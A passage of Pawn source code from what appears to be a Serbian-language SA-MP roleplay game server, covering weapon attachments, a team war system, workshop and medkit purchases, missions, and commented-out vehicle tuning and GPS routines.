                    switch(weps[a]){
                        case 16: if(GetPlayerWeapon(i) != 16) SetPlayerAttachedObject( i, 6, 342, 16, -0.110845, -0.041751, 0.087840, 55.051963, 84.884071, 247.221984, 1.000000, 1.000000, 1.000000 );
                        case 17: if(GetPlayerWeapon(i) != 17) SetPlayerAttachedObject( i, 6, 1672, 16, -0.110606, -0.054021, 0.036716, 215.687911, 354.659393, 90.000000, 1.000000, 1.000000, 1.000000 );
                        case 18: if(GetPlayerWeapon(i) != 18) SetPlayerAttachedObject( i, 6, 344, 15, 0.029351, -0.208807, -0.164047, 0.000000, 359.932037, 0.000000, 1.000000, 1.000000, 1.000000 );
                    }
                }
                case 9: {
                    if(IsPlayerAttachedObjectSlotUsed(i, 7)) RemovePlayerAttachedObject(i, 7);
                    switch(weps[a]){
                        case 43: if(GetPlayerWeapon(i) != 43) SetPlayerAttachedObject( i, 7, 367, 1, 0.227036, 0.171111, -0.085516, 270.000000, 0.000000, 180.000000, 1.000000, 1.000000, 1.000000 );
                        case 41: if(GetPlayerWeapon(i) != 41) SetPlayerAttachedObject( i, 7, 365, 12, 0.174919, -0.004211, -0.142508, 0.000000, 270.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
                    }
                }
                case 11: {
                    if(IsPlayerAttachedObjectSlotUsed(i, 8)) RemovePlayerAttachedObject(i, 8);
                    if(weps[a] == 44 || weps[a] == 45) if(GetPlayerWeapon(i) != 44 && GetPlayerWeapon(i) != 45) SetPlayerAttachedObject( i, 8, 369, 2, 0.000000, 0.078037, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
                }
            }
        }
        wep[i] = GetPlayerWeapon(i);
    }
    return 1;
}

public Disable(playerid) {
    d[playerid] = 0;
    wep[playerid] = -1;
    for(new a = 0; a < 9; a++) if(IsPlayerAttachedObjectSlotUsed(playerid, a)) RemovePlayerAttachedObject(playerid, a);
    return 1;
}
 
public Enable(playerid) {
    d[playerid] = 1;
    return 1;
}
 
public HoldingWeaponsForAll(boolean) {
    if(boolean == 0){
        if(!d1) return 1;
        for(new i = 0; i < MAX_PLAYERS+1; i++) for(new a = 0; a < 9; a++) if(IsPlayerAttachedObjectSlotUsed(i, a)) RemovePlayerAttachedObject(i, a);
        KillTimer(timer);
        d1 = 0;
        return 1;
    }
    if(boolean == 1){
        if(d1) return 1;
        timer = SetTimer("AttachWeapon", TIME, 1);
        d1 = 1;
        return 1;
    }
    return 0;
}

timer Timer_DestroyEffectObject[1000](objectid, objectid2)
{
    if(IsValidObject(objectid))
        DestroyObject(objectid);
 
    if(IsValidObject(objectid2))
        DestroyObject(objectid2);
}

ResetWarStatistics( playerid ) {
    WARPInfo[ playerid ][ warTeam ][ 0 ] = false;
    WARPInfo[ playerid ][ warTeam ][ 1 ] = false;
    WARPInfo[ playerid ][ warKills ] = 0;
    WARPInfo[ playerid ][ warDeaths ] = 0;
    WARPInfo[ playerid ][ warID ] = -1;
}

public StopWAR( w ) {
    WARInfo[ w ][ warActive ] = false;
    WARInfo[ w ][ warCreating ] = false;
    KillTimer( WARInfo[ w ][ warTimer ] );

    foreach( Player, i ) {
        if( WARPInfo[ i ][ warID ] == w ) {

            if (WARInfo[ w ][ warTeamScore ][ 0 ] > WARInfo[ w ][ warTeamScore ][ 1 ] ) {
                if( WARPInfo[ i ][ warTeam ][ 0 ] ) {
                    SCM( i, -1, ""COL_ORANGE"WAR "COL_WHITE"| "COL_ORANGE"Pobedio si i dobio"COL_WHITE" 100%!");
                }
            }
            if(WARInfo[ w ][ warTeamScore ][ 1 ] > WARInfo[ w ][ warTeamScore ][ 0 ] ) {
                if( WARPInfo[ i ][ warTeam ][ 1 ] ) {
                    SCM( i, -1, ""COL_ORANGE"WAR "COL_WHITE"| "COL_ORANGE"Pobedio si i dobio"COL_WHITE" 100%!");
                }
            }
            SCM( i, -1, globalstring );
            format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR "COL_WHITE"| "COL_ORANGE"Tvoj score "COL_WHITE"|  "COL_ORANGE"Kills: "COL_WHITE"%d "COL_WHITE"| "COL_ORANGE"Deaths: "COL_WHITE"%d", WARPInfo[ i ][ warKills ], WARPInfo[ i ][ warDeaths ] );
            SCM( i, -1, globalstring);
            format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR "COL_WHITE"| "COL_TEAM1"Team 1: "COL_WHITE"%d | "COL_TEAM2"Team 2: "COL_WHITE"%d", WARInfo[ w ][ warTeamScore ][ 0 ], WARInfo[ w ][ warTeamScore ][ 1 ]  );
            SCM( i, -1, globalstring );

            WARPInfo[ i ][ warID ] = -1;
            SetPlayerHealth( i, 100 );
            
            SetPlayerPos( i, WARPInfo[ i ][ LastPosition ][ 0 ], WARPInfo[ i ][ LastPosition ][ 1 ],  WARPInfo[ i ][ LastPosition ][ 2 ] );
            SetPlayerVirtualWorld( i, WARPInfo[ i ][ LastVirtualWorld ] );
            SetPlayerInterior( i, WARPInfo[ i ][ LastInterior ] );
            
            
            ResetPlayerWeapons( i );

            ResetWarStatistics( i );

            WarTDControl( i, false );
        }
    }
    WARInfo[ w ][ warTeamMembers ][ 0 ] = 0;
    WARInfo[ w ][ warTeamMembers ][ 1 ] = 0;
    WARInfo[ w ][ warTeamScore ][ 0 ] = 0;
    WARInfo[ w ][ warTeamScore ][ 1 ] = 0;
    return true;
}

public StopWARTimer( w ) {
    if( WARInfo[ w ][ warActive ] == false ) { WARInfo[ w ][ warTimerMin ] = 1; WARInfo[ w ][ warTimerSec ] = 0; KillTimer( WARInfo[ w ][ warTimerTime ] ); }
    WARInfo[ w ][ warTimerSec ]++;
    if( WARInfo[ w ][ warTimerSec ] == 60 ) { WARInfo[ w ][ warTimerMin ]++; WARInfo[ w ][ warTimerSec ] = 0; }
    foreach( Player, i ) {
        if( WARPInfo[ i ][ warID ] == w ) {
            new vreme_string[ 10 ];
            if( WARInfo[ w ][ warTimerSec ] >= 51 ) {
                format( vreme_string, sizeof( vreme_string ), "%d:0%d",10*60000/60000 - WARInfo[ w ][ warTimerMin ], 10*60000/10000 - WARInfo[ w ][ warTimerSec ] );
            }
            else if( WARInfo[ w ][ warTimerMin ] >= 6 ) {
                format( vreme_string, sizeof( vreme_string ), "0%d:%d",10*60000/60000 - WARInfo[ w ][ warTimerMin ], 10*60000/10000 - WARInfo[ w ][ warTimerSec ] );
            }
            else if( WARInfo[ w ][ warTimerSec ] >= 51 && WARInfo[ w ][ warTimerMin ] >= 6) {
                format( vreme_string, sizeof( vreme_string ), "0%d:0%d",10*60000/60000 - WARInfo[ w ][ warTimerMin ], 10*60000/10000 - WARInfo[ w ][ warTimerSec ] );
            }
            else {
                format( vreme_string, sizeof( vreme_string ), "%d:%d",10*60000/60000 - WARInfo[ w ][ warTimerMin ], 10*60000/10000 - WARInfo[ w ][ warTimerSec ] );
            }
            PlayerTextDrawSetString( i, WARTextDraw[ i ][ 8 ],  vreme_string );
        }
    }
    return true;
}

CMD:wp( playerid, params[]) {
    new text[ 64 ];
    if( WARPInfo[ playerid ][ warID ] == -1 ) return SendErrorMessage( playerid, "Nisi u War-u!" );
    if( sscanf( params, "s[64]", text ) ) return SendUsageMessage( playerid, "/wp [ text ]" );
    if( WARPInfo[ playerid ][ warTeam ][ 0 ] == true ) {
        format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR | "COL_TEAM1"%s: "COL_WHITE"%s", ImeIgraca( playerid ), text );
    }
    if( WARPInfo[ playerid ][ warTeam ][ 1 ] == true ) {
        format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR | "COL_TEAM2"%s: "COL_WHITE"%s", ImeIgraca( playerid ), text );
    }
    WARMessage( WARPInfo[ playerid ][ warID ], -1, globalstring );
    return true;
}

CMD:war( playerid ) {
    if( GetPlayerLeader( playerid ) < 1) return SendErrorMessage( playerid, "Nisi Ovlascen!" );
    SPD( playerid, dialog_WAR, DSL, "War System", "Napravi War\nPozovi Igraca\nIzbaci Igraca\nZaustavi War", "Potvrdi", "Odustani");
    return true;
}

CMD:napustiwar(playerid) {

    if( WARPInfo[ playerid ][ warID ] == -1 ) return SendErrorMessage( playerid, "Nisi u War-u" );
    new w = WARPInfo[ playerid ][ warID ];
    if( WARInfo[ w ][ warActive ] == false ) return SendErrorMessage( playerid, "War nije pokrenut");
    WARPInfo[ playerid ][ warID ] = -1;
    SetPlayerHealth( playerid, 100 );

    SetPlayerPos( playerid, WARPInfo[ playerid ][ LastPosition ][ 0 ], WARPInfo[ playerid ][ LastPosition ][ 1 ],  WARPInfo[ playerid ][ LastPosition ][ 2 ] );
    SetPlayerVirtualWorld( playerid, WARPInfo[ playerid ][ LastVirtualWorld ] );
    SetPlayerInterior( playerid, WARPInfo[ playerid ][ LastInterior ] );
    ResetPlayerWeapons( playerid );

    ResetWarStatistics( playerid );
    if( WARPInfo[ playerid ][ warTeam ][ 0 ] == true ) { WARInfo[ w ][ warTeamMembers ][ 0 ]--; }
    if( WARPInfo[ playerid ][ warTeam ][ 1 ] == true ) { WARInfo[ w ][ warTeamMembers ][ 1 ]--; }

    SendInfoMessage(playerid, "Uspesno si napustio war!");

    WarTDControl( playerid, false );

    return 1;
}

CMD:makegun(playerid) {

    //if(GetFactionType(playerid) != ORG_TIP_MAFIJA) return SendErrorMessage(playerid, "Samo clanovi mafije!");
    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 525.1547,-2335.6174,508.6938)) return SendErrorMessage(playerid, "Nisi na mestu!");

    ShowPlayerDialog(playerid, dialog_MakeGun, DIALOG_STYLE_TABLIST_HEADERS, "Make Gun",
        "Oruzije\tPotreban Mats\tMetkovi\n\
        Deagle\t300\t60\n\
        M4\t350\t130\n\
        AK47\t300\t130\n\
        Sniper\t900\t20\n\
        Shotgun\t100\t30\n\
        Uzi\t150\t120\n\
        MP5\t200\t120",
        "Napravi Gun", "Odustani");

    return 1;
}

CMD:kupiradionicu( playerid, params[] ) {

    //return SendErrorMessage(playerid, "Radionice su iskljucene do 16.01.2022, zbog nestajanja vozila!!");
    new id = GetNearestWorkShop( playerid );

    if( id == -1 ) return SendErrorMessage( playerid, "U blizini nema nijedan WorkShop." );
    if( PlayerInfo[ playerid ][ xWorkShopGarage ] != -1 ) return SendErrorMessage( playerid, "Vec posedujete jedan workshop." );
    if( PlayerInfo[ playerid ][ xNovac ] < RadionicaBuyPrice ) return SendErrorMessage( playerid, "Nemate dovoljno novca (%d$).", RadionicaBuyPrice);
    if(strcmp( WorkShopInfo[id][wVlasnik], "Niko", true )) return SendErrorMessage(playerid, "Ova radionica ima vlasnika!");

    DajIgracuNovac( playerid, -RadionicaBuyPrice );
    PlayerInfo[ playerid ][ xWorkShopGarage ] = id;
    SavePlayer( playerid );

    strmid( WorkShopInfo[ id ][ wVlasnik ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME );

    SaveWorkShop(id);
    WorkShopVehicleCheck(id);
    WorkShopLabelUpdate(id);

    SendInfoMessage( playerid, "Kupili ste Workshop za %d$!", RadionicaBuyPrice);
    return (true);
}

CMD:workshop(playerid) {
    //return SendErrorMessage(playerid, "Radionice su iskljucene do 16.01.2022, zbog nestajanja vozila!!");

    if(PlayerInfo[playerid][xWorkShopGarage] == -1) return SendErrorMessage(playerid, "Ti nemas svoj WorkShop!");

    if(IsPlayerInRangeOfPoint(playerid, 20.0, 1377.1881,-35.8018,1001.0511) && GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][xWorkShopGarage]) {

        ShowPlayerDialog(playerid, dialog_WorkShop, DIALOG_STYLE_LIST, "WorkShop", "Informacije\nKupi Auto\nKupi Delove\nProdaja Auta\nKupovina Radnika\nProdaj Drzavi\nProdaj Igracu", D_ODABERI, D_ODUSTANI);
        return 1;
    }
    else return SendErrorMessage(playerid, "Nisi na mestu ili u svom WorkShop-u!");
}

CMD:kupidelove(playerid, params[]) {
    //return SendErrorMessage(playerid, "Radionice su iskljucene do 16.01.2022, zbog nestajanja vozila!!");

    if(!IsPlayerInRangeOfPoint(playerid, 3.0, 2376.1082,-2017.1085,14.8329)) return SendErrorMessage(playerid, "Nisi na mestu!");
    if(PlayerInfo[playerid][xWorkShopGarage] == -1) return SendErrorMessage(playerid, "Ti nemas svoj WorkShop!");

    new id = PlayerInfo[playerid][xWorkShopGarage];

    if(WorkShopInfo[id][wBrojDelova] > 12) return SendErrorMessage(playerid, "Imas preko 12+ delova!");

    new kolicina;
    if(sscanf(params, "d", kolicina)) return SendUsageMessage(playerid, "/kupidelove [KOLICINA]");

    if(kolicina < 1 || kolicina > 12) return SendErrorMessage(playerid, "Ne mozes manje od 1 ili vise od 12!");
    new ukupno = WorkShopInfo[id][wBrojDelova] + kolicina;
    if(ukupno > 12) return SendErrorMessage(playerid, "Ne mozes da predjes 12 delova!");

    new novac = kolicina * 15000;

    if(GetPlayerMoney(playerid) < novac) return SendErrorMessage(playerid, "Nemas dovoljno novca! (%d$)", novac);

    DajIgracuNovac(playerid, -novac);
    WorkShopInfo[id][wBrojDelova] += kolicina;

    SaveWorkShop(id);

    SendInfoMessage(playerid, "Uspesno si kupio %d delova za %d$!", kolicina, novac);

    return 1;
}

// timer NosiVoziloTimer[1000](playerid) {

//     if(NosiVozilo[playerid] != 0) {

//         NosiVozilo[playerid]--;
//         va_GameTextForPlayer(playerid, "~r~%d", 1000, 4, NosiVozilo[playerid]);
//         defer NosiVoziloTimer(playerid);

//         return 1;
//     }
//     else {

//         if(KupioVozilo[playerid] == 1) return 0;

//         if(IsValidVehicle(WorkShopVeh[playerid]))
//             Novi_DestroyVehicle( WorkShopVeh[ playerid ] );
//         if(IsValidVehicle(WorkShopVehTow[playerid]))
//             Novi_DestroyVehicle(WorkShopVehTow[playerid]);
//         WorkShopBuyModel[playerid] = 0;
//         WorkShopBuyPrice[playerid] = 0;

//         SendInfoMessage(playerid, "Nisi odneo vozilo na vreme!");

//         return 1;
//     }
// }

task PopravkaWorkShop1[7200000]() {

    for(new id = 0; id < MAX_WORKSHOPS; id++) {

        new filename[32];
        format(filename, sizeof(filename), WorkShop_File, id);
        if(fexist(filename)) {

            if(strcmp( WorkShopInfo[id][wVlasnik], "Niko", true )) {

                if(WorkShopInfo[id][wModel1] > 0 && WorkShopInfo[id][wBrojDelova] >= 1) {

                    if(WorkShopInfo[id][wPopravka1] >= 4) continue;

                    WorkShopInfo[id][wBrojDelova]--;

                    if(WorkShopInfo[id][wBrojRadnika] == 1) 
                        WorkShopInfo[id][wPopravka1]++;

                    if(WorkShopInfo[id][wBrojRadnika] == 2) 
                        WorkShopInfo[id][wPopravka1] += 3;

                    if(WorkShopInfo[id][wPopravka1] >= 4) {
                        SaveWorkShop(id);
                        continue;
                    }

                    WorkShopInfo[id][wPopravka1]++;
                    SaveWorkShop(id);

                }
            }
        }
    }

    return 1;
}

task PopravkaWorkShop2[7200000]() {

    for(new id = 0; id < MAX_WORKSHOPS; id++) {

        new filename[32];
        format(filename, sizeof(filename), WorkShop_File, id);
        if(fexist(filename)) {

            if(strcmp( WorkShopInfo[id][wVlasnik], "Niko", true )) {

                if(WorkShopInfo[id][wModel2] > 0 && WorkShopInfo[id][wBrojDelova] >= 1) {

                    if(WorkShopInfo[id][wPopravka2] >= 4) continue;

                    WorkShopInfo[id][wBrojDelova]--;
                    
                    if(WorkShopInfo[id][wBrojRadnika] == 1) 
                        WorkShopInfo[id][wPopravka2]++;

                    if(WorkShopInfo[id][wBrojRadnika] == 2) 
                        WorkShopInfo[id][wPopravka2] += 3;

                    if(WorkShopInfo[id][wPopravka2] >= 4) {
                        SaveWorkShop(id);
                        continue;
                    }

                    WorkShopInfo[id][wPopravka2]++;
                    SaveWorkShop(id);

                }
            }
        }
    }

    return 1;
}

timer PucaoSkoro[20000](i) {

    SkoroPucao[i] = false;
    return 1;
}

timer SkiniMapIcon[10000](i) {

    RemovePlayerMapIcon(i, 80);
    return 1;
} 

timer RanjenIgracTiming[1000](playerid) {

    if(RanjenIgracCount[playerid] != 0) {

        RanjenIgracCount[playerid]--;
        va_GameTextForPlayer(playerid, "%d sekundi", 1000, 3, RanjenIgracCount[playerid]);
        RanjenIgracTimer = defer RanjenIgracTiming(playerid);
        return 1;
    }
    else {

        SetPlayerHealth(playerid, 0.0);
        RanjenIgrac[playerid] = false;
        SendInfoMessage(playerid, "Umro si zato sto te niko nije spasio!");
        TextDrawHideForPlayer(playerid, PozadinaTD);
        return 1;
    }
}

CMD:kupimedkit(playerid, params[]) {

    if(IsPlayerInRangeOfPoint(playerid, 2.0, 1298.3145,-1865.2567,13.5561)) {

        if(PlayerInfo[playerid][xMedKit] >= 3) return SendErrorMessage(playerid, "Ne mozes imati vise od 3 medkit-a kod sebe!");

        new kolicina;
        if(sscanf(params, "d", kolicina)) return SendUsageMessage(playerid, "/kupimedkit [kolicina]");

        if(kolicina < 1 || kolicina > 3) return SendErrorMessage(playerid, "Kolicina moze biti od 1 do 3!");

        new ima = PlayerInfo[playerid][xMedKit] + kolicina;
        if(ima > 3) return SendErrorMessage(playerid, "Ne mozes imati vise od 3 medkit-a kod sebe!");

        new novac = kolicina * 5000;

        if(GetPlayerMoney(playerid) < novac) return SendErrorMessage(playerid, "Nemas dovoljno novca! ( %d$ )", novac);

        DajIgracuNovac(playerid, -novac);
        PlayerInfo[playerid][xMedKit] += kolicina;
        SavePlayer(playerid);

        SendInfoMessage(playerid, "Uspesno si kupio %d medkit-a za %d$!", kolicina, novac);
        SendInfoMessage(playerid, "Sada imas %d!", PlayerInfo[playerid][xMedKit]);
        return 1;
    }
    else return SendErrorMessage(playerid, "Moras biti u apoteci!");
}

CMD:medkit(playerid, params[]) {

    new id;
    if(sscanf(params, "u", id)) return SendUsageMessage(playerid, "/medkit [ID]");
    if(PlayerInfo[playerid][xMedKit] < 1) return SendErrorMessage(playerid, "Nemas medkit!");
    if(PodizanjeVreme[playerid] != 0) return SendErrorMessage(playerid, "Ne mozes to dok lecis nekoga!");
    if(id == playerid) return SendErrorMessage(playerid, "Ne mozes samog sebe!");
    if(!RanjenIgrac[id]) return SendErrorMessage(playerid, "Igrac nije ranjen");

    RanjenBar[playerid] = CreatePlayerProgressBar(playerid, 320.0, 200.0, 80.0, 8.0, 0xcfcaf1FF, 100.0, BAR_DIRECTION_RIGHT);
    SetPlayerProgressBarValue( playerid, RanjenBar[ playerid ], 0.0 );
    ShowPlayerProgressBar( playerid, RanjenBar[ playerid ] );

    TogglePlayerControllable(playerid, false);
    ApplyAnimation( playerid, "BOMBER", "Plant_Loop", 4.0, 1, 0, 0, 0, 0 );

    PodizanjeVreme[playerid] = 0.0;

    defer PodizanjeIgraca(playerid, id);

    return 1;
}

timer PodizanjeIgraca[1000](playerid, id) {

    if(PodizanjeVreme[playerid] != 100.0) {

        PodizanjeVreme[playerid] += 10;
        SetPlayerProgressBarValue(playerid, RanjenBar[playerid], PodizanjeVreme[playerid]);

        defer PodizanjeIgraca(playerid, id);

        return 1;
    }
    else {

        ClearAnimations(playerid);
        TogglePlayerControllable(playerid, true);  

        ClearAnimations(id);
        TogglePlayerControllable(id, true);  
        RanjenIgrac[id] = false;
        SetPlayerHealth(id, 60.0);
        stop RanjenIgracTimer;
        TextDrawHideForPlayer(id, PozadinaTD);

        DestroyPlayerProgressBar(playerid, RanjenBar[playerid]);
        PodizanjeVreme[playerid] = 0;

        PlayerInfo[playerid][xMedKit]--;
        SavePlayer(playerid);

        SendInfoMessage(playerid, "Podigao si %s!", ImeIgraca(id));
        SendInfoMessage(id, "%s te je podigao!", ImeIgraca(playerid));

        if(PlayerInfo[playerid][xAchivements][7] == 0) {

            achivementPassed(playerid, 7, 4000);
        }

        return 1;
    }
}

ptask ProveraRanjen[1000](playerid) {

    if(WARPInfo[ playerid ][ warID ] != -1) return 0;
    if(NaDmEventu[playerid]) return 0;

    new Float:HP;
    GetPlayerHealth(playerid, HP);
    if(HP < 15.0 && HP > 0.0) {

        if(!RanjenIgrac[playerid]) {

            TogglePlayerControllable(playerid, false);
            ApplyAnimation( playerid, "SWEET", "Sweet_injuredloop", 4.0, 1, 0, 0, 0, 0, 1);
            RanjenIgracCount[playerid] = 180;
            RanjenIgrac[playerid] = true;
            TextDrawShowForPlayer(playerid, PozadinaTD);
            RanjenIgracTimer = defer RanjenIgracTiming(playerid);
            return 1;
        } 
    }
    return 1;
}

task ResetMisijeActor[60000]() {

    SetDynamicActorPos(BarmenActor, 970.0329,-1553.2056,21.5722);
    SetDynamicActorFacingAngle(BarmenActor, 257.8307);

    SetDynamicActorPos(PevacActor, 977.4540,-1554.4117,21.6191);
    SetDynamicActorFacingAngle(PevacActor, 94.8235);

    SetDynamicActorPos(GledalacActor, 974.0856,-1550.8312,21.5738);
    SetDynamicActorFacingAngle(GledalacActor, 228.4731);

    SetDynamicActorPos(NaSankuActor, 965.9231,-1553.9894,21.5722);
    SetDynamicActorFacingAngle(NaSankuActor, 270.1470);

    SetDynamicActorPos(SefActor, 985.7722,-1551.6263,22.9322);
    SetDynamicActorFacingAngle(SefActor, 90.7736);

    return 1;
}

CMD:misije(playerid) {

    if(!IsPlayerInRangeOfPoint(playerid, 2.0, misijePosX, misijePosY, misijePosZ)) return SendErrorMessage(playerid, "Nisi na mestu!");
    if(radiMisiju[playerid] > 0) return SendErrorMessage(playerid, "Vec radis misiju! /prekinimisiju");
    if(radiPaparazo[playerid]) return SendErrorMessage(playerid, "Vec radis paparazo misiju! /zaustavipaparazo");

    ShowPlayerDialog(playerid, dialog_Misije, DIALOG_STYLE_LIST, "Misije", "1) Doza Kokaina\n2) Osveta\n3) Kradja\n4) Paparazo Lov", "Potvrdi", "Odustani");

    return 1;
}

CMD:prekinimisiju(playerid) {

    if(radiMisiju[playerid] == 0) return SendErrorMessage(playerid, "Ne radis nijednu misiju!");

    if(radiMisiju[playerid] == 1) {

        Novi_DisablePlayerCheckpoint(playerid);

        misijaNosi[playerid] = false;
        misijaVraca[playerid] = false;
    }

    if(radiMisiju[playerid] == 2) {

        Novi_DisablePlayerCheckpoint(playerid);

        ResetPlayerWeapons(playerid);

        misijaUbistvo[playerid] = 0;
    }

    if(radiMisiju[playerid] == 3) {

        Novi_DisablePlayerCheckpoint(playerid);

        misijaKradja[playerid] = 0;

        ResetPlayerWeapons(playerid);

        DestroyPlayerObject(playerid, misijaLaptop[playerid]);
    }

    misijaCounter[playerid] = 0;
    radiMisiju[playerid] = 0;

    va_GameTextForPlayer(playerid, "~r~Mission Failed", 5000, 3);

    SendInfoMessage(playerid, "Uspesno si zaustavio misiju!");

    return 1;
}

timer misijaCounterTimer[60000](playerid) {

    if(radiMisiju[playerid] == 1 && misijaNosi[playerid]) {

        misijaCounter[playerid]++;

        if(misijaCounter[playerid] < 7) 
            defer misijaCounterTimer(playerid);
    }

    if(radiMisiju[playerid] == 2 && misijaUbistvo[playerid] == 1) {

        misijaCounter[playerid]++;
        
        if(misijaCounter[playerid] < 7) 
            defer misijaCounterTimer(playerid);
    } 

    return 1;
}

missionPassed(playerid, money) {

    SendInfoMessage(playerid, "Uspesno si zavrsio misiju i dobio %d$!", money);
    PlayAudioStreamForPlayer(playerid, "https://audio.jukehost.co.uk/ZG5GtMTBJYqOXGkiZUSnzFzpE0ZZaUs8", 0.0, 0.0, 0.0, 50.0, 0);
    va_GameTextForPlayer(playerid, "~p~Mission Passed~n~~w~+ %d$", 5000, 3, money);
    DajIgracuNovac(playerid, money);

    calculateKey(playerid);

    if(PlayerInfo[playerid][xAchivements][4] == 0) {

        achivementPassed(playerid, 4, 2000);
    }

    return 1;
}

calculateKey(playerid) {

    new br = RandomNew(1, 50);
    if(br == 10) {

        PlayerInfo[playerid][xKey]++;
        SavePlayer(playerid);
        SendInfoMessage(playerid, "Dobio si 1 key za uspesno predjenu misiju ili zavrsenu turu posla! /opencase");
    }

    return 1;
}

// CMD:cipujvozilo(playerid, params[]) {

//     if(!IsPlayerInRangeOfPoint(playerid, 2.0, -2183.8901,715.0043,54.0909)) return SendErrorMessage(playerid, "Nisi na mestu!");
//     if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Nisi u nijednom vozilu!");
//     if( TipVozila[ GetPlayerVehicleID( playerid ) ] != PRIVATNO_VOZILO ) return SendErrorMessage( playerid, "Nisi u nijednom privatnom vozilu." );
//     if(koristiRampu) return SendErrorMessage(playerid, "Neko vec koristi rampu za cipovanje!");

//     podigniCipRampu();
//     defer ProveraRampaTimer(playerid);

//     ShowPlayerDialog(playerid, dialog_Cipovanje, DIALOG_STYLE_LIST, "Cipovanje Vozila", "1. Stage ( 50.000$ )\n2. Stage ( 100.000$ )\n3. Stage ( 150.000$ )\n4. Stage ( 200.000$ )", "Potvrdi", "Odustani");

//     return 1;
// }

// timer ProveraRampaTimer[50](playerid) {

//     if(koristiRampu) {

//         if(!IsPlayerConnected(playerid)) return spustiCipRampu();

//         if(!IsPlayerInRangeOfPoint(playerid, 2.0, -2183.8901,715.0043,54.0909)) return spustiCipRampu();

//         defer ProveraRampaTimer(playerid);

//     }
//     return 1;
// }

// podigniCipRampu() {

//     koristiRampu = true;
//     MoveDynamicObject(CipRampa, -2183.94556, 715.05060, 53.16970, 4.0, 0, 0, 0);

//     return 1;
// }

// spustiCipRampu() {

//     koristiRampu = false;
//     MoveDynamicObject(CipRampa, -2183.94556, 715.05060, 51.16970, 4.0, 0, 0, 0);

//     return 1;
// }

// ptask proveraBrzineVozila[1000](playerid) {

//     if(!IsPlayerInAnyVehicle(playerid)) return 1;
    
//     new keys,
//         ud,
//         lr,
//         modelID = GetVehicleModel(GetPlayerVehicleID( playerid )),
//         Float:VelPos[3];
    
//     GetPlayerKeys( playerid, keys, ud, lr );
//     GetVehicleVelocity(GetPlayerVehicleID(playerid),VelPos[0],VelPos[1],VelPos[2]);

//     new vozilo = GetPlayerVehicleID(playerid);
//     new scriptid = ScriptIDVozila[vozilo];

//     if(keys && KEY_UP)
//     {
//         if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
//         {

//             if(scriptid == -1) {

//                 if(PlayerInfo[playerid][xSkillDrive] == 1) { 
//                     if(GetSpeed(playerid) < BrzinaVozila[modelID-400][1]+STAGE_1) { 
//                         SetVehicleVelocity(GetPlayerVehicleID(playerid),VelPos[0]*1.1,VelPos[1]*1.1,VelPos[2]*1.1); 
//                     }
//                 }
//                 else if(PlayerInfo[playerid][xSkillDrive] == 2) {
//                     if(GetSpeed(playerid) < BrzinaVozila[modelID-400][1]+STAGE_2) {
//                         SetVehicleVelocity(GetPlayerVehicleID(playerid),VelPos[0]*1.1,VelPos[1]*1.1,VelPos[2]*1.1);
//                     }
//                 }

//                 else if(PlayerInfo[playerid][xSkillDrive] == 3) {
//                     if(GetSpeed(playerid) < BrzinaVozila[modelID-400][1]+STAGE_3) {
//                         SetVehicleVelocity(GetPlayerVehicleID(playerid),VelPos[0]*1.1,VelPos[1]*1.1,VelPos[2]*1.1);
//                     }
//                 }
//                 else if(PlayerInfo[playerid][xSkillDrive] >= 4) {
//                     if(GetSpeed(playerid) < BrzinaVozila[modelID-400][1]+STAGE_4) {
//                         SetVehicleVelocity(GetPlayerVehicleID(playerid),VelPos[0]*1.1,VelPos[1]*1.1,VelPos[2]*1.1);
//                     }
//                 }
//                 return 1;
//             }
//             else {

//                 if(VehicleInfo[scriptid][vCipovanje] == 1 || PlayerInfo[playerid][xSkillDrive] == 1) { 
//                     if(GetSpeed(playerid) < BrzinaVozila[modelID-400][1]+STAGE_1) { 
//                         SetVehicleVelocity(GetPlayerVehicleID(playerid),VelPos[0]*1.1,VelPos[1]*1.1,VelPos[2]*1.1); 
//                     }
//                 }
//                 else if(VehicleInfo[scriptid][vCipovanje] == 2 || PlayerInfo[playerid][xSkillDrive] == 2) {
//                     if(GetSpeed(playerid) < BrzinaVozila[modelID-400][1]+STAGE_2) {
//                         SetVehicleVelocity(GetPlayerVehicleID(playerid),VelPos[0]*1.1,VelPos[1]*1.1,VelPos[2]*1.1);
//                     }
//                 }

//                 else if(VehicleInfo[scriptid][vCipovanje] == 3 || PlayerInfo[playerid][xSkillDrive] == 3) {
//                     if(GetSpeed(playerid) < BrzinaVozila[modelID-400][1]+STAGE_3) {
//                         SetVehicleVelocity(GetPlayerVehicleID(playerid),VelPos[0]*1.1,VelPos[1]*1.1,VelPos[2]*1.1);
//                     }
//                 }
//                 else if(VehicleInfo[scriptid][vCipovanje] == 4 || PlayerInfo[playerid][xSkillDrive] >= 4) {
//                     if(GetSpeed(playerid) < BrzinaVozila[modelID-400][1]+STAGE_4) {
//                         SetVehicleVelocity(GetPlayerVehicleID(playerid),VelPos[0]*1.1,VelPos[1]*1.1,VelPos[2]*1.1);
//                     }
//                 }
//             }
//         }
//     }

//     return 1;
// }

public OnPlayerClosestNodeIDChange(playerid,old_NodeID,new_NodeID) { //kada igrac stigne na odrediste
    // if(new_NodeID != -1) {
    //     if(PlayerRoute[playerid][Destination] == new_NodeID) {
    //         DisableGPS(playerid);
    //     }
    // }
    return 1;
}

public GPS_WhenRouteIsCalculated(routeid,node_id_array[],amount_of_nodes,Float:distance,Float:Polygon[],Polygon_Size,Float:NodePosX[],Float:NodePosY[],Float:NodePosZ[])//Kada se ruta kreira
{

    // if(checkpointCheck[routeid]) {

    //     PlayerRoute[routeid][calculating] = false; //stavlja kreiranje rute na false
    //     checkpointCheck[routeid] = false;
    //     if(amount_of_nodes > 1) { //ako je broj tacaka na putu vece od 1
    //         for(new i = 0; i < amount_of_nodes; ++i) {
    //             PlayerRoute[routeid][CreatedObjects][i] = CreatePlayerObject(routeid,19605,NodePosX[i],NodePosY[i],NodePosZ[i]+1.0,0.0,0.0,0.0,150.0); //kreiranje objekata po putu...
    //         }
